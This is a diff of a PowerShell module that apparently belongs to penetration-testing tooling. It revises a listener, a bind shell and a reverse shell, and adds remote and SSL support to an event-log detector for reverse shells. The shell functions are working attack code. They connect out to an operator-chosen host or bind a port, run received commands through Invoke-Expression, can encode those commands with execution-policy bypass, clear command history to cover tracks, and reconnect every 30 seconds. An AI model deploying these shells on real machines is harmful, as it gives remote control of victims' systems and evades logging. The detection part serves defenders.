@@ -35,16 +35,16 @@ None
 
 
 .LINK
-https://roberthsoborne.com
 https://osbornepro.com
-https://btps-secpack.com
+https://encrypit.osbornepro.com
+https://btpssecpack.osbornepro.com
+https://writeups.osbornepro.com
 https://github.com/tobor88
-https://gitlab.com/tobor88
+https://github.com/OsbornePro
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
-
 #>
 Function Start-Listener {
     [CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'Low')]
@@ -60,13 +60,11 @@ Function Start-Listener {
 
 
     $PortString = $Port.ToString()
-
     Write-Verbose "Checking for availability of $PortString"
 
     $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
     $Connections = $TCPProperties.GetActiveTcpListeners()
-    If ($Connections.Port -Contains "$Port")
-    {
+    If ($Connections.Port -Contains "$Port") {
 
         Throw "[!] Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes."
 
@@ -75,32 +73,26 @@ Function Start-Listener {
     Write-Verbose "Defining listener object"
     $Socket = New-Object -TypeName System.Net.Sockets.TcpListener('0.0.0.0', $Port)
 
-    If ($Null -eq $Socket)
-    {
+    If ($Null -eq $Socket) {
 
         Exit
 
-    } # End If
+    }  # End If
 
     Write-Verbose "Starting listener on port $PortString and creating job to allow closing the connection"
+    Write-Output "[i] If you receive an error message here stating 'An attempt was made to access a socket in a way forbidden by its access permissions' you need to restart the hns service. `n`t[i] Restart-Service -Name hns -Force"
+    If ($PSCmdlet.ShouldProcess($Socket.Start())) {
 
-    If ($PSCmdlet.ShouldProcess($Socket.Start()))
-    {
-
-        Try
-        {
+        Try {
 
             Write-Output ("[*] Listening on [0.0.0.0] (port $PortString)")
-            While ($True)
-            {
+            While ($True) {
 
                 Write-Verbose "Waiting for connection..."
-                If ($Socket.Pending())
-                {
+                If ($Socket.Pending()) {
 
                     $Client = $Socket.AcceptTcpClient()
-
-                    Break;
+                    Break
 
                 }  # End If
 
@@ -108,12 +100,9 @@ Function Start-Listener {
 
             }  # End While
 
-        }  # End Try
-        Finally
-        {
+        } Finally {
 
-            If (!($Client.Connected))
-            {
+            If (!($Client.Connected)) {
 
                 Write-Verbose "Terminating connection"
                 $Socket.Stop()
@@ -123,7 +112,7 @@ Function Start-Listener {
 
             }  # End If
 
-        }  # End Finally
+        }  # End Try Finally
 
         Write-Output "[*] Connection Established"
 
@@ -134,16 +123,14 @@ Function Start-Listener {
         $Encoding = New-Object -TypeName System.Text.AsciiEncoding
 
         Write-Verbose "Begin command execution loop"
-        Do
-        {
+        Do {
 
             $Command = Read-Host
 
             $Writer.WriteLine($Command)
             $Writer.Flush();
 
-            If ($Command -eq "exit")
-            {
+            If ($Command -eq "exit") {
 
                 Write-Verbose "Exiting"
                 Break
@@ -151,9 +138,7 @@ Function Start-Listener {
             }  # End If
 
             $Read = $Null
-
-            While ($Stream.DataAvailable -or $Null -eq $Read)
-            {
+            While ($Stream.DataAvailable -or $Null -eq $Read) {
 
                 $Read = $Stream.Read($Buffer, 0, 2048)
                 $Out = $Encoding.GetString($Buffer, 0, $Read)
@@ -170,13 +155,11 @@ Function Start-Listener {
         $Stream.Dispose()
         Write-Verbose "Connection closed"
 
-    }  # End If
-    Else
-    {
+    } Else {
 
         Write-Output "[*] Start-Listener would have started a listener on port $PortString"
 
-    }  # End Else
+    }  # End If Else
 
 } # End Function Start-Listener
 
@@ -218,14 +201,15 @@ None
 
 
 .LINK
-https://roberthsoborne.com
 https://osbornepro.com
-https://btps-secpack.com
+https://encrypit.osbornepro.com
+https://btpssecpack.osbornepro.com
+https://writeups.osbornepro.com
 https://github.com/tobor88
-https://gitlab.com/tobor88
+https://github.com/OsbornePro
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 #>
 Function Start-Bind {
@@ -247,8 +231,7 @@ Function Start-Bind {
 
         $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
         $Connections = $TCPProperties.GetActiveTcpListeners()
-        If ($Connections.Port -Contains "$Port")
-        {
+        If ($Connections.Port -Contains "$Port") {
 
             Throw "[!] Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes."
 
@@ -257,24 +240,20 @@ Function Start-Bind {
         Write-Verbose "Creating listener on port $PortString"
         $Listener = New-Object -TypeName System.Net.Sockets.TcpListener]('0.0.0.0', $Port)
 
-        If ($PSCmdlet.ShouldProcess($Listener.Start()))
-        {
+        If ($PSCmdlet.ShouldProcess($Listener.Start())) {
 
             Write-Output "[*] PowerShell.exe is bound to port $PortString"
 
-            Try
-            {
+            Try {
 
-                While ($True)
-                {
+                While ($True) {
 
                     Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
-                    If ($Listener.Pending())
-                    {
+                    If ($Listener.Pending()) {
 
                         $Client = $Listener.AcceptTcpClient()
 
-                        Break;
+                        Break
 
                     }  # End If
 
@@ -282,13 +261,10 @@ Function Start-Bind {
 
                 }  # End While
 
-            }  # End Try
-            Finally
-            {
+            } Finally {
 
                 Write-Output "[*] Press Ctrl + C a couple of times in order to reuse the port you selected as a listener again"
-                If ($Listener.Pending())
-                {
+                If ($Listener.Pending()) {
 
                     Write-Output "[*] Closing open port"
                     $Client.Close()
@@ -296,7 +272,7 @@ Function Start-Bind {
 
                 }  # End If
 
-            }  # End Finally
+            }  # End Try Finally
 
             Write-Output "[*] Connection Established"
             $Stream = $Client.GetStream()
@@ -310,26 +286,20 @@ Function Start-Bind {
             $Stream.Write($SendBytes,0,$SendBytes.Length)
 
             Write-Verbose "Begin command execution cycle"
-            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
-            {
+            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {
 
                 $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                 $Data = $EncodedText.GetString($Bytes, 0, $i)
-
-                Try
-                {
+                Try {
 
                     $SendBack = (Invoke-Expression -Command $Data 2>&1 | Out-String)
 
-                }  # End Try
-                Catch
-                {
+                } Catch {
 
                     Write-Output "Failure occured attempting to execute the command on target."
-
                     $Error[0] | Out-String
 
-                }  # End Catch
+                }  # End Try Catch
 
                 Write-Verbose "Initial data send failed. Attempting a second time"
                 $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -ExpandProperty 'Path') + '> '
@@ -348,13 +318,11 @@ Function Start-Bind {
             $Listener.Stop()
             Write-Verbose "Connection closed"
 
-        }  # End If
-        Else
-        {
+        } Else {
 
             Write-Output "[*] Start-Bind would have bound PowerShell to a listener on port $PortString"
 
-        }  # End Else
+        }  # End If Else
 
 }  # End Function Start-Bind
 
@@ -407,14 +375,15 @@ Contact: rosborne@osbornepro.com
 
 
 .LINK
-https://roberthsoborne.com
 https://osbornepro.com
-https://btps-secpack.com
+https://encrypit.osbornepro.com
+https://btpssecpack.osbornepro.com
+https://writeups.osbornepro.com
 https://github.com/tobor88
-https://gitlab.com/tobor88
+https://github.com/OsbornePro
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -492,19 +461,16 @@ Function Invoke-ReversePowerShell {
     Write-Verbose "Creating a fun infinite loop. - The Shadow King (Amahl Farouk)"
     $GodsMakeRules = "They dont follow them"
 
-    While ($GodsMakeRules -eq 'They dont follow them')
-    {
+    While ($GodsMakeRules -eq 'They dont follow them') {
 
         Write-Verbose "Default error action is being defined as Continue"
         $ErrorActionPreference = 'Continue'
 
-        Try
-        {
+        Try {
 
             Write-Output "[*] Connection attempted. Check your listener."
 
-            Switch ($PSCmdlet.ParameterSetName)
-            {
+            Switch ($PSCmdlet.ParameterSetName) {
 
             'Reverse' {
 
@@ -515,16 +481,13 @@ Function Invoke-ReversePowerShell {
                 $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")
                 $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()
 
-                While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
-                {
+                While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {
 
                     $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)
 
-                    If ($Command.StartsWith("kill-link"))
-                    {
+                    If ($Command.StartsWith("kill-link")) {
 
-                        If ($ClearHistory.IsPresent)
-                        {
+                        If ($ClearHistory.IsPresent) {
 
                             Write-Output "[*] Attempting to clear command history"
 
@@ -543,12 +506,11 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing
                         Exit
 
                     } # End If
-                    Try
-                    {
+                    
+                    Try {
 
                         # Executes commands
-                        If ($Obfuscate.IsPresent)
-                        {
+                        If ($Obfuscate.IsPresent) {
 
                             Write-Verbose "Obfuscating command"
 
@@ -556,57 +518,51 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing
                             $ExecuteCmd = PowerShell.exe -EncodedCommand $Base64Cmd -NoLogo -NoProfile -ExecutionPolicy Bypass | Out-String
                             $ExecuteCmdAgain = $ExecuteCmd + "PS " + (Get-Location).Path + "> "
 
-                        }  # End If
-                        Else
-                        {
+                        } Else {
 
                             $ExecuteCmd = Invoke-Expression -Command $Command 2>&1 | Out-String
                             $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "
 
-                        }  # End Else
+                        }  # End If Else
 
-                    } # End Try
-                    Catch
-                    {
+                    } Catch {
 
                         $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
                         $ExecuteCmdAgain  =  "ERROR: " + $Error[0].ToString() + "`n`n" + "PS " + (Get-Location).Path + "> "
 
-                    } # End Catch
+                    } # End Try Catch
 
                     $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
                     $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
                     $Stream.Flush()
 
                 } # End While
+                
                 $Client.Close()
 
             }  # End Reverse Switch
 
             'Bind' {
 
-            Write-Warning "Sorry this is not there yet. I am still figuring this part out"
-            $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
-            $Stream = $Client.GetStream()
+                Write-Warning "Sorry this is not there yet. I am still figuring this part out"
+                $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+                $Stream = $Client.GetStream()
 
-            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
-            {
+                While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {
 
-                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($Stream)
-                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
-                $Stream.Flush()
+                    $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($Stream)
+                    $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+                    $Stream.Flush()
 
-            } # End While
+                } # End While
 
-            $Client.Close()
+                $Client.Close()
 
-            }  # End Bind Switch
+                }  # End Bind Switch
 
             }  # End Switch
 
-        } # End Try
-        Catch
-        {
+        } Catch {
 
             Write-Output "There was a connection error. Retrying occurs every 30 seconds"
 
@@ -618,8 +574,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing
             [Int]$Timer = 30
             $Length = $Timer / 100
 
-            For ($Timer; $Timer -gt 0; $Timer--)
-            {
+            For ($Timer; $Timer -gt 0; $Timer--) {
 
                 $Text = "0:" + ($Timer % 60) + " seconds left"
                 Write-Progress -Activity "Attempting to re-establish connection in: " -Status $Text -PercentComplete ($Timer / $Length)
@@ -627,12 +582,13 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing
 
             }  # End For
 
-        } # End Catch
+        } # End Try Catch
 
     } # End While
+    
     $Client.Close()
-    If ($Listener)
-    {
+    
+    If ($Listener) {
 
         $Listener.Stop()
 
@@ -647,14 +603,17 @@ This cmdlet can be used to discover reverse shell connections from the past 24 h
 
 
 .DESCRIPTION
-Search the Windows Event Viewer for event id 4656 where a tcp listener was created and connected too. The appropriate logging will need to be enabled in the event viewer.
+Search the Windows Event Viewer for event id 4656 where a tcp listener was created and connected too. If that returns 0 results event ID 5154 is then returned. The appropriate logging will need to be enabled in the event viewer.
 
 
 .PARAMETER ComputerName
-This parameter is for helping to better define a connection you may want to look for. This parameter is currently not in use for this cmdlet.
+Define a remote device you want to search the event logs of. WinRM is attempted first. If that fails RPC is attempted
 
 .PARAMETER FilePath
 Specifies a path to one locations. Wildcards are not permitted.
+
+.PARAMETER UseSSL
+Specifies to attempt using WinRM over HTTPS when grabbing event logs from a remote $ComputerName. Note that if WinRM connection fails it will next attempt an RPC connection
 
 
 .EXAMPLE
@@ -682,14 +641,15 @@ Find-ReverseShell returns System.Diagnostics.Eventing.Reader.EventLogRecord obje
 
 
 .LINK
-https://roberthsoborne.com
 https://osbornepro.com
-https://btps-secpack.com
+https://encrypit.osbornepro.com
+https://btpssecpack.osbornepro.com
+https://writeups.osbornepro.com
 https://github.com/tobor88
-https://gitlab.com/tobor88
+https://github.com/OsbornePro
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 #>
@@ -725,34 +685,71 @@ Function Find-ReverseShell {
                 HelpMessage="Enter the full path name to a .xml file. Example: C:\Temp\results.xml")]
             [Alias("Path")]
             [ValidateScript( {If ((!(Test-Path -Path $FilePath)) -and ($FilePath -like "*.xml")) {New-Item -Type Directory -Path $FilePath}} )]
-            [String]$FilePath
+            [String]$FilePath,
+
+            [Parameter(
+                ParameterSetName="Remote",
+                Mandatory=$False)]  # End Parameter
+            [Switch][Bool]$UseSSL
 
         ) # End param
 
 
-    If ($ComputerName)
-    {
+    If ($ComputerName) {
+
+        $SSL = $False
+        If ($UseSSL.IsPresent) {
+
+            $SSL = $True
+
+        }  # End If
 
         Write-Output "[*] Checking for Reverse Shells that connect to a System.Net.Sockets.TcpListener object, excluding ports opened by the paessler account"
-        $TcpListenerCheck = Get-WinEvent -ComputerName $ComputerName -LogName 'Security' -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SubjectUserName']!='paessler'] and EventData[Data[@Name='ObjectServer']='WS-Management Listener']]" -ErrorVariable $CmdError
+        Try {
 
-    }  # End If
-    Else
-    {
+            $TcpListenerCheck = Invoke-Command -HideComputerName $ComputerName -UseSSL:$SSL -ScriptBlock {
+            
+                Get-WinEvent -ComputerName $ComputerName -LogName 'Security' -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SubjectUserName']!='paessler'] and EventData[Data[@Name='ObjectServer']='WS-Management Listener']]" -ErrorVariable $CmdError
+                If ($Null -eq $TcpListenerCheck) {
+            
+                    $TcpListenerCheck = Get-WinEvent -LogName 'Security' -FilterXPath "*[System[EventID=5154 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SourceAddress']!='127.0.0.1'] and EventData[Data[@Name='FilterRTID']=0] and EventData[Data[@Name='SourcePort']!=139]]" -ErrorVariable $CmdError
+                    $TcpListenerCheck = $TcpListenerCheck | Where-Object -FilterScript { $_.Properties.Value.Get(1) -like "*powershell*" -or  $_.Properties.Value.Get(1) -like "*cmd*" }
+
+                }  # End If
+
+            }  # End Invoke-Command
+
+        } Catch {
+
+            $TcpListenerCheck = Get-WinEvent -ComputerName $ComputerName -LogName 'Security' -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SubjectUserName']!='paessler'] and EventData[Data[@Name='ObjectServer']='WS-Management Listener']]" -ErrorVariable $CmdError
+            If ($Null -eq $TcpListenerCheck) {
+            
+                $TcpListenerCheck = Get-WinEvent -ComputerName $ComputerName -LogName 'Security' -FilterXPath "*[System[EventID=5154 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SourceAddress']!='127.0.0.1'] and EventData[Data[@Name='FilterRTID']=0] and EventData[Data[@Name='SourcePort']!=139]]" -ErrorVariable $CmdError
+                $TcpListenerCheck = $TcpListenerCheck | Where-Object -FilterScript { $_.Properties.Value.Get(1) -like "*powershell*" -or  $_.Properties.Value.Get(1) -like "*cmd*" }
+
+            }  # End If
+
+        }  # End Try Catch
+
+    } Else {
 
         Write-Output "[*] Checking for Reverse Shells that connect to a System.Net.Sockets.TcpListener object, excluding ports opened by the paessler account"
         $TcpListenerCheck = Get-WinEvent -LogName 'Security' -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SubjectUserName']!='paessler'] and EventData[Data[@Name='ObjectServer']='WS-Management Listener']]" -ErrorVariable $CmdError
+        If ($Null -eq $TcpListenerCheck) {
+        
+            $TcpListenerCheck = Get-WinEvent -LogName 'Security' -FilterXPath "*[System[EventID=5154 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SourceAddress']!='127.0.0.1'] and EventData[Data[@Name='FilterRTID']=0] and EventData[Data[@Name='SourcePort']!=139]]" -ErrorVariable $CmdError
+            $TcpListenerCheck = $TcpListenerCheck | Where-Object -FilterScript { $_.Properties.Value.Get(1) -like "*powershell*" -or  $_.Properties.Value.Get(1) -like "*cmd*" }
 
-    }  # End Else
+        }  # End If
 
-    If ($Null -ne $TcpListenerCheck)
-    {
+    }  # End If Else
+
+    If ($Null -ne $TcpListenerCheck) {
 
         Write-Verbose "Shell Event was found"
-        $TcpListenerCheck | Select-Object -Property *
+        Return $TcpListenerCheck
 
-        If ($FilePath)
-        {
+        If ($FilePath) {
 
             Write-Verbose "Building XML file and saving too $FilePath"
             $TcpListenerCheck.ToXml() | Out-File -FilePath "$FilePath"
@@ -761,12 +758,11 @@ Function Find-ReverseShell {
 
         }  # End If
 
-    }  # End If
-    Else
-    {
+    } Else {
 
         Write-Output "[*] No Reverse shells have been discovered to exist in the last 24 hours."
 
-    }  # End Else
+    }  # End If Else
 
 } # End Function Find-ReverseShell
+
